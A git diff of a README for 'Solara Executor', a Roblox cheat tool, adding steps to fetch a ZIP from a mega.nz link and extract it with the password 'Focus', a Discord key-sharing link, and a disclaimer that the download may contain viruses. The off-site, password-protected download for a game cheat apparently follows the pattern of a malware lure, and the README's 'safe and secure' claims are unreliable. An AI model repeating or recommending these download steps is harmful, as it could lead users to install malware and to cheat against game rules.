@@ -9,15 +9,16 @@ Solara Download
 To install Solara Executor, follow these simple steps:
 1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/rFIyRZBa)
 
-2. **Encryption Key can be found in the [discord](https://discord.gg/VbGQybjvRe)**
+2. **Encryption Key can be found in the [Discord](https://discord.gg/VbGQybjvRe)**
   
-3. Extract the downloaded ZIP file to your desired location on your system.
+3. Extract the downloaded ZIP with password "Focus" to your desired location on your system.
 
 ## Table of Contents
 - [Introduction](#introduction)
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
+- [Disclaimer](#disclaimer)
 - [Contributing](#contributing)
 - [License](#license)
 
@@ -37,7 +38,6 @@ Solara Executor provides a robust set of features designed to elevate your gamin
 - Roblox Update Compatibility: Stay ahead with full compatibility with the latest Roblox updates.
 - Safety and Security: Enjoy peace of mind with secure and reliable usage.
 
-
 ## Usage
 Once you have installed Solara Executor, you can start using it to enhance your Roblox gameplay. Here are some basic steps to get you started:
 1. Launch the Solara Executor application.
@@ -45,6 +45,9 @@ Once you have installed Solara Executor, you can start using it to enhance your 
 3. Choose the script you want to execute.
 4. Click on the execute button to run the selected script.
 5. Enjoy your enhanced Roblox experience with Solara Executor!
+
+## Disclaimer 
+Remember, although we can vouch these downloads are safe, there is never a 100% guarantee with downloading anything that viruses can not be present, so please download at your own risk, we are not responsible for any damage, caused by these downloads.
 
 ## Contributing
 We actively encourage contributions from the Roblox community to help us improve Solara Executor. Whether you have suggestions, bug reports, or wish to contribute directly to the development of Solara Executor for Roblox, we welcome your input. Feel free to submit a pull request—your involvement is essential in making Solara Executor even better for all Roblox users!
